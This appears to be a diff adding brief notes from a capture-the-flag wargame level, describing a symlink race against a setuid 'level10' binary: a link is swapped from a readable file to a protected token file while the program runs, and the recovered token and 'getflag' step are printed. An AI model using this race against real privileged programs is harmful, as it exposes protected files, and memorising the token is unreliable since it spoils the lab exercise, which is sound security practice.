@@ -1,0 +1,7 @@
+copy, compile, and run server.c on vm
+create a symbolic link on a file we have rights on:
+	ln -sf /tmp/server.c /tmp/link
+execute level10 and then change target of symbolic link to token so we can read it:
+	/home/user/level10/level10 /tmp/link 127.0.0.1 & ln -sf /home/user/level10/token /tmp/link
+	=> woupa2yuojeeaaed06riuj63c
+getflag
